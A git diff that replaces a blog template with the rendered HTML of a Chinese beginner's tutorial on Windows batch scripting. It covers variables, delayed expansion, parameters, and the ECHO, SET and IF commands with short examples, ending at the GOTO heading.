@@ -1,32 +1,1331 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>批处理 | WineMonk</title><meta name="keywords" content="Windows,Bat批处理"><meta name="author" content="shaozhy,1361151272@qq.com"><meta name="copyright" content="shaozhy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="批处理批处理可以通过条件语句(if)和流程控制语句(goto)来控制命令运行的流程，在批处理中也可以使用循环语句(for)来批处理是基于cmd的循环执行一条命令。当然，批处理文件的编程能力与C语言等编程语句比起来是十分有限的，也是十分不规范的。批处理的程序语句就是一条条的DOS命令（包括内部命令和外部命令），而批处理的能力主要取决于你所使用的命令。第三，每个编写好的批处理文件都相当于一个DOS的外">
+<meta property="og:type" content="article">
+<meta property="og:title" content="批处理">
+<meta property="og:url" content="https://shaoshao.net.cn/2021/07/21/20210721135525000/index.html">
+<meta property="og:site_name" content="WineMonk">
+<meta property="og:description" content="批处理批处理可以通过条件语句(if)和流程控制语句(goto)来控制命令运行的流程，在批处理中也可以使用循环语句(for)来批处理是基于cmd的循环执行一条命令。当然，批处理文件的编程能力与C语言等编程语句比起来是十分有限的，也是十分不规范的。批处理的程序语句就是一条条的DOS命令（包括内部命令和外部命令），而批处理的能力主要取决于你所使用的命令。第三，每个编写好的批处理文件都相当于一个DOS的外">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shaoshao.net.cn/images/blog/cover/current/post_18.jpg">
+<meta property="article:published_time" content="2021-07-21T05:55:25.000Z">
+<meta property="article:modified_time" content="2023-04-14T01:28:34.000Z">
+<meta property="article:author" content="shaozhy">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Bat批处理">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shaoshao.net.cn/images/blog/cover/current/post_18.jpg"><link rel="shortcut icon" href="/cover/head_portrait.jpg"><link rel="canonical" href="https://shaoshao.net.cn/2021/07/21/20210721135525000/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '批处理',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-14 09:28:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
         
-    if theme.reward.enable && theme.reward.QR_code
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://shaoshao.net.cn/images/blog/cover/headportrait/shsh_cn.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/discover/archives/"><div class="headline">文章</div><div class="length-num">154</div></a></div><div class="data-item"><a href="/discover/tags/"><div class="headline">标签</div><div class="length-num">93</div></a></div><div class="data-item"><a href="/discover/categories/"><div class="headline">分类</div><div class="length-num">77</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 发现</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/discover/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/discover/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/discover/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/discover/codingStandards/"><i class="fa-fw fas fa-code"></i><span> 军规</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 图库</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fa fa-commenting"></i><span> 留言</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://shaoshao.net.cn/images/blog/cover/current/post_18.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">WineMonk</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 发现</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/discover/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/discover/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/discover/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/discover/codingStandards/"><i class="fa-fw fas fa-code"></i><span> 军规</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 图库</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fa fa-commenting"></i><span> 留言</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">批处理</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-21T05:55:25.000Z" title="发表于 2021-07-21 13:55:25">2021-07-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-14T01:28:34.000Z" title="更新于 2023-04-14 09:28:34">2023-04-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/discover/categories/Windows%E7%9B%B8%E5%85%B3/">Windows相关</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/discover/categories/Windows%E7%9B%B8%E5%85%B3/Bat%E6%89%B9%E5%A4%84%E7%90%86/">Bat批处理</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">13.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>52分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="批处理"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><h2 id="批处理-1"><a href="#批处理-1" class="headerlink" title="批处理"></a>批处理</h2><p>可以通过条件语句(if)和流程控制语句(goto)来控制命令运行的流程，在批处理中也可以使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5">循环语句</a>(for)来批处理是基于cmd的循环执行一条命令。当然，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6">批处理文件</a>的编程能力与C语言等编程语句比起来是十分有限的，也是十分不规范的。批处理的程序语句就是一条条的DOS命令（包括<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%86%85%E9%83%A8%E5%91%BD%E4%BB%A4">内部命令</a>和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4">外部命令</a>），而批处理的能力主要取决于你所使用的命令。第三，每个编写好的批处理文件都相当于一个DOS的外部命令　你可以把它所在的目录放到你的DOS搜索路径变量%path%（详见后面）中来使得它可以在任意位置运行。一个良好的习惯是在硬盘上建立一个bat或者batch目录（例如C:\BATCH），然后将所有你编写的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6">批处理文件</a>放到该目录中，这样只要在path中设置上c:\batch，你就可以在任意位置运行所有你编写的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F">批处理程序</a>。</p>
+<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>简单的说，批处理的作用就是自动的连续执行多条命令。</p>
+<p>这里先讲一个最简单的应用：在启动wps软件时，每次都必须执行（&gt;前面内容表示DOS提示符）：</p>
+<p>C:&gt;cd wps</p>
+<p>C:\WPS&gt;spdos</p>
+<p>C:\WPS&gt;py</p>
+<p>C:\WPS&gt;wbx</p>
+<p>C:\WPS&gt;wps</p>
+<p>如果每次用WPS之前都这样执行一遍，您是不是觉得很麻烦呢？</p>
+<p>好了，用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86">批处理</a>，就可以实现将这些麻烦的操作简单化，首先我们编写一个runwps<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6">批处理文件</a>，内容如下：</p>
+<p>@echo off</p>
+<p>c:</p>
+<p>cd\wps</p>
+<p>spdos</p>
+<p>py</p>
+<p>wbx</p>
+<p>wps</p>
+<p>cd\</p>
+<p>以后，我们每次进入wps，只需要运行runwps这个批处理文件即可。</p>
+<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="变量的类型"><a href="#变量的类型" class="headerlink" title="变量的类型"></a>变量的类型</h3><p>批处理中的变量基本上是万能的,可以储存各种各样的数据,不过用来计算时你会发现变量类型转为了int,数值的极端范围为[-2147483648，2147483647],如果不拿来计算的话,似乎数万位也是可以的</p>
+<h3 id="变量的命名"><a href="#变量的命名" class="headerlink" title="变量的命名"></a>变量的命名</h3><p>批处理的变量命名没有什么限制..不过建议命名还是遵守标准的命名方法,不然</p>
+<p>@Echo Off</p>
+<p>Set IF&#x3D;Set</p>
+<p>%IF% lF&#x3D;Goto</p>
+<p>:IF</p>
+<p>IF %IF%&#x3D;&#x3D;IF %lF% IF</p>
+<p>像这样的代码是很蛋疼的…</p>
+<p>正是因为变量的名称是可以自由调配的 ： 数字 字母 甚至汉字都可以变成变量名。不像VBS一样。</p>
+<h3 id="变量的扩展"><a href="#变量的扩展" class="headerlink" title="变量的扩展"></a>变量的扩展</h3><p>扩展,你可以理解为显示出这个的值,如果你想要使用这个变量的值一般情况下都要扩展</p>
+<p>扩展方式:%变量%或!变量!</p>
+<p>其中!变量!是延迟扩展,需要加上SetLocal EnableDelayedExpansion语句才能够实现,延迟扩展对于新手来说是一个很难理解的东西,就这么说吧,当你的变量在一个语句的内部受到了改变,而在这个改变之后又要输出,那么你必须要延迟扩展,这个牵扯到了奇奇怪怪的预处理机制,不详解了.用连接符号连起来的语句,if,for和它们后面括号内的内容都是属于一个语句</p>
+<p>例:</p>
+<p>@echo off</p>
+<p>set num&#x3D;10</p>
+<p>set num&#x3D;100&amp;echo %num%</p>
+<p>echo %num%</p>
+<p>echo 虽然已经将num的值更改为100,但由于没有延迟扩展,所以值仍为10,不过在下一个语句num的值就改变了</p>
+<p>pause&gt;nul</p>
+<p>例:</p>
+<p>@echo off</p>
+<p>SetLocal EnableDelayedExpansion</p>
+<p>set num&#x3D;10</p>
+<p>set num&#x3D;100&amp;echo !num!</p>
+<p>echo 现在两个num的值一样了</p>
+<p>echo %num%</p>
+<p>pause&gt;nul</p>
+<p>变量在扩展过程中还可以做一点手脚</p>
+<p>例:</p>
+<p>set str&#x3D;1234567890</p>
+<p>echo %str:~0,5%</p>
+<p>echo %str:~1,5%</p>
+<p>echo %str:<del>-5%<br>　　echo %str:</del>5,-2%</p>
+<p>echo %str:7890&#x3D;54321%</p>
+<p>pause&gt;nul</p>
+<p>很神奇吧?这就是对字符串的处理，这个是批处理的特性，叫“变量延迟”</p>
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>参数在批处理的表达是%0,%1,%2….%9 ，以及全部参数%*（不包括%0）</p>
+<p>%0的初始量是批处理本身路径，类似%~f0</p>
+<p>一般你只能取前九个参数，除非你使用%*</p>
+<p>shift命令允许你获取后面的参数</p>
+<p>格式：shift [&#x2F;n]</p>
+<p>n为1~8的数</p>
+<p>shift 会使%0变成%1，%1变成%2……%9变成原来的第10个参数（不推荐）</p>
+<p>一般使用shift &#x2F;1，将会从%1开始替换，保留原%0</p>
+<p>注意：call标签时参数也是可用的，而且当返回时参数将变回原来的</p>
+<p>例子：</p>
+<p>@echo off</p>
+<p>call :标签 arg1 arg2</p>
+<p>echo %1</p>
+<p>::会显示回显已打开</p>
+<p>echo %2</p>
+<p>exit</p>
+<p>:标签</p>
+<p>echo %1</p>
+<p>::这时会显示arg1</p>
+<p>echo %2</p>
+<p>::这时会显示arg2</p>
+<p>exit &#x2F;b</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>ECHO</p>
+<p><strong>显示信息，或将命令回显打开或关上。</strong></p>
+<p><strong>ECHO [ON | OFF]</strong></p>
+<p><strong>ECHO [message]</strong></p>
+<p><strong>要显示当前回显设置，键入不带参数的 ECHO。</strong></p>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/echo/35157">echo</a> 命令的第一个用法,echo on和echo off</p>
+<p>echo on表示打开回显,echo off表示关闭回显,何为回显?打开回显就是执行命令时会把命令显示出来,关闭回显反之.</p>
+<p>echo 命令的第二个用法,echo message,这个很简单,就是显示后面的信息</p>
+<p>echo 命令第三个用法,显示当前回显设置,就是显示回显打开或关闭</p>
+<p>echo也可以输出文件。下面再说。</p>
+<p>以下的这段代码可以让你很好地理解echo的用法(包括如何用echo输出空行)</p>
+<p><em>echo 这是没有关闭回显</em></p>
+<p><em>echo;</em></p>
+<p><em>echo</em></p>
+<p><em>echo off</em></p>
+<p><em>echo 这是关闭了回显</em></p>
+<p><em>echo;</em></p>
+<p><em>echo</em></p>
+<p><em>pause</em></p>
+<p>PAUSE</p>
+<p><strong>暂停<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/2192936">批处理程序</a>，并显示以下消息:</strong></p>
+<p><strong>请按任意键继续. . .</strong></p>
+<p>这个命令没有什么好说的,要暂停时直接pause就行了</p>
+<p>CLS</p>
+<p><strong>清除屏幕。</strong></p>
+<p><strong>CLS</strong></p>
+<p>这个命令也没有什么好说的,清屏,自己试一次就知道了</p>
+<p>REM</p>
+<p><strong>在批处理文件或 CONFIG.SYS 里加上注解或说明。</strong></p>
+<p><strong>REM [comment]</strong></p>
+<p>这个命令同样没什么好说的,用法就是rem 注释</p>
+<p>PS:其实可以用”::”代替”REM”,可以提高执行速度,不过REM的兼容性更好,我还是建议大家用rem注释</p>
+<p>SET</p>
+<p><strong>1.给变量赋值(撤销)</strong></p>
+<p>例1:</p>
+<p><em>@echo off</em></p>
+<p><em>set str&#x3D;My name is Xiao</em></p>
+<p><em>echo %str%</em></p>
+<p><em>rem 批处理中的变量一般需要用%来扩展,详见特殊符号一节</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>例<em>2.</em></p>
+<p><em>@echo off</em></p>
+<p><em>set str&#x3D;ABCDEFGHIJKLMN</em></p>
+<p><em>echo %str%</em></p>
+<p><em>set str&#x3D;</em></p>
+<p><em>echo;%str%</em></p>
+<p><em>rem 还记得加”;”可以实现什么效果吗?一个空行,为什么要这么做呢?想不出来的话去掉这个”;”试试</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>上面的例子中,一个是给变量赋值,一个是撤销变量的值*<br>*　　</p>
+<p><strong>2.等待用户输入数据(开关&#x2F;P)</strong></p>
+<p>例:**<br>**　　</p>
+<p><em>@echo off</em></p>
+<p><em>set &#x2F;p name&#x3D;请输入你的姓名:</em></p>
+<p><em>set &#x2F;p age&#x3D;请输入你的年龄(纯数字):</em></p>
+<p><em>echo 所以,%name%今年%age%岁咯?</em></p>
+<p><em>pause&gt;nul</em></p>
+<p><strong>3.计算(开关&#x2F;A)</strong></p>
+<p>例1:</p>
+<p><em>@echo off</em></p>
+<p><em>set &#x2F;a num&#x3D;(12*2)+(13*4)</em></p>
+<p><em>echo (12x2)+(13x4)&#x3D;%num%</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>例2:</p>
+<p><em>@echo off</em></p>
+<p><em>set &#x2F;p num&#x3D;请输入一个数字(不要超过2147483647):</em></p>
+<p><em>REM 批处理能处理的数字不能超过32位(二进制)</em></p>
+<p><em>set &#x2F;a num*&#x3D;2</em></p>
+<p><em>echo 这个数字的两倍是%num%</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>附:Set &#x2F;a num*&#x3D;2与set &#x2F;a num&#x3D;num*2等价</p>
+<p><strong>() - 分组</strong></p>
+<p><strong>! ~ - - 一元运算符</strong></p>
+<p>*** &#x2F; % - 算数运算符**</p>
+<p><strong>+ - - 算数运算符</strong></p>
+<p><strong>&lt;&lt; &gt;&gt; - 逻辑移位</strong></p>
+<p><strong>- 按位“与”</strong></p>
+<p><strong>^ - 按位“异”</strong></p>
+<p><strong>| - 按位“或”</strong></p>
+<p><strong>&#x3D; *&#x3D; &#x2F;&#x3D; %&#x3D; +&#x3D; -&#x3D; - 赋值</strong></p>
+<p><strong>&amp;&#x3D; ^&#x3D; |&#x3D; &lt;&lt;&#x3D; &gt;&gt;&#x3D;</strong></p>
+<p><strong>, - 表达式分隔符</strong></p>
+<p>set &#x2F;a支持多行表达式并列,比如set &#x2F;a num1&#x3D;1+1,num2&#x3D;1+2,num3&#x3D;1+3</p>
+<p>并且set &#x2F;a不需要扩展变量,比如set &#x2F;a num&#x3D;%num2%+%num3%与set &#x2F;a num&#x3D;num2+num3等价</p>
+<p><strong>以上内容仅为基础教程</strong></p>
+<p><strong>4.显示当前已定义变量</strong></p>
+<p>例:</p>
+<p><em>@set</em></p>
+<p><em>@pause&gt;nul</em></p>
+<p>是不是很简单?其实它还有更高级的用法呢</p>
+<p><em>@set a</em></p>
+<p><em>@pause&gt;nul</em></p>
+<p><em>@set s</em></p>
+<p><em>@pause&gt;nul</em></p>
+<p>你们发现什么了吗??它的用法就是这些,不用多说了</p>
+<p>IF</p>
+<p><strong>1.IF的第一种用法,比较字符串</strong></p>
+<p>例:</p>
+<p><em>set &#x2F;p PW&#x3D;请输入密码:</em></p>
+<p><em>if %PW%&#x3D;&#x3D;bat (</em></p>
+<p><em>echo YES!</em>　</p>
+<p><em>) ELSE (</em></p>
+<p><em>Rem [else] 为可选参数,表示否则,即如果变量PW等于bat则输出YES!否则输出NO!</em>　</p>
+<p><em>echo NO!</em>　</p>
+<p><em>)</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>通过set &#x2F;p和if可以实现一个简单的密码判断,当然这个密码判断可以很轻易地被破解,仔细动脑筋想一想,该怎么破解呢.</p>
+<p>不过这个密码判断尚有不足之处,假如我们什么都不输入直接回车,便会提示错误,那该怎么办呢?很简单,只要加上双引号(其它的符号也行)就行了&#x3D;&gt;if “%PW%”&#x3D;&#x3D;”bat”</p>
+<p><strong>2.IF的第二种用法,比较数字</strong></p>
+<p>例:</p>
+<p><em>set &#x2F;p num1&#x3D;请第一个输入数字:</em></p>
+<p><em>set &#x2F;p num2&#x3D;请第二个输入数字:</em></p>
+<p><em>if not %num1% LSS %num2% (</em></p>
+<p>*rem lss表示小于<br>*　　</p>
+<p>*rem [not]为可选参数,表示非,即如果变量num1不小于变量num2就输出第一个数字大,否则输出第二个数字大<br>*　　</p>
+<p><em>echo 第一个数字大</em></p>
+<p><em>) ELSE (</em></p>
+<p>*echo 第二个数字大<br>*　　</p>
+<p><em>)</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>这段代码可以实现一个简单的判断,不过尚有不足之处—–如果这两个数字相等呢,这就要请出我们的else if啦(当然你也可以用几个if来判断)</p>
+<p><em>set &#x2F;p num1&#x3D;请第一个输入数字:</em></p>
+<p><em>set &#x2F;p num2&#x3D;请第二个输入数字:</em></p>
+<p><em>if “%num1%” gtr “%num2%” (</em></p>
+<p><em>echo 第一个数字大</em></p>
+<p><em>) ELSE if “%num1%” EQU “%num2%” (</em></p>
+<p>*echo 一样大<br>*　　</p>
+<p><em>) ELSE (</em></p>
+<p><em>echo 第二个数字大</em>　</p>
+<p><em>)</em></p>
+<p><em>pause&gt;nul</em></p>
+<p><em>——</em><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6/9324961">比较运算符</a>—–</p>
+<p><strong>EQU - 等于</strong></p>
+<p><strong>NEQ - 不等于</strong></p>
+<p><strong>LSS - 小于</strong></p>
+<p><strong>LEQ - 小于或等于</strong></p>
+<p><strong>GTR - 大于</strong></p>
+<p><strong>GEQ - 大于或等于</strong></p>
+<p><strong>3.IF的第三种用法,检测文件(夹)是否存在</strong></p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p><em>if exist C:\windows (</em></p>
+<p>*echo 你的C盘有windows文件(夹^)<br>*　　</p>
+<p><em>) else (</em></p>
+<p>*echo 你的C盘没有windows文件(夹^)<br>*　　</p>
+<p><em>)</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>“^”为转义符号,在特殊符号一节再作讲解</p>
+<p><strong>4.IF的第四种用法,检测变量是否被定义</strong></p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p><em>set var&#x3D;aiwozhonghua</em></p>
+<p><em>if defined var (</em></p>
+<p>*echo 变量var已被定义,它的值为%var%<br>*　　</p>
+<p><em>) else (</em></p>
+<p>*echo 变量var没有被定义<br>*　　</p>
+<p><em>)</em></p>
+<p><strong>pause&gt;nul</strong></p>
+<p>去掉第一行的set看看执行结果有什么不同,你明白它的用法了吗?</p>
+<p><strong>5.IF的第五种用法,判断返回值(ERRORLEVEL)</strong></p>
+<p>要判断返回值,首先要理解返回值是个什么概念,批处理中的返回值一般表示了上个命令的执行结果(成功&#x2F;失败&#x2F;等)</p>
+<p>每个命令执行完毕后返回值都会做相应的更改,一般返回值为0表示成功,1表示失败,有一些第三方的返回值比较特殊(如Choice.exe,Tmos.exe,Cmos.exe),在这里就不讲解了</p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p><em>echo;&gt;&gt;%systemroot%\test.txt</em></p>
+<p><em>if errorlevel 0 ( echo 写入成功! ) else echo 写入失败</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>这段代码尝试向*%systemroot%\system32*写入数据,如果权限不够或杀毒软件拦截就会写入失败,这时就会显示”写入失败”.不知道*%systemroot%<em>表示了什么?单独键入set自己仔细看一下结果.</em><br>*　　</p>
+<p>不过看到后面你会发现这段代码还有更简便的写法</p>
+<p>注:用 if errorlevel判断返回值时要将返回值从大到小排列</p>
+<p>例:</p>
+<p>*@echo off<br>*　　</p>
+<p><em>choice &#x2F;C:ABC &#x2F;n “A&#x2F;B&#x2F;C”</em></p>
+<p><em>if errorlevel 3 echo You choose the C</em></p>
+<p><em>if errorlevel 2 echo You choose the B</em></p>
+<p><em>if errorlevel 1 echo You choose the A</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>GOTO</p>
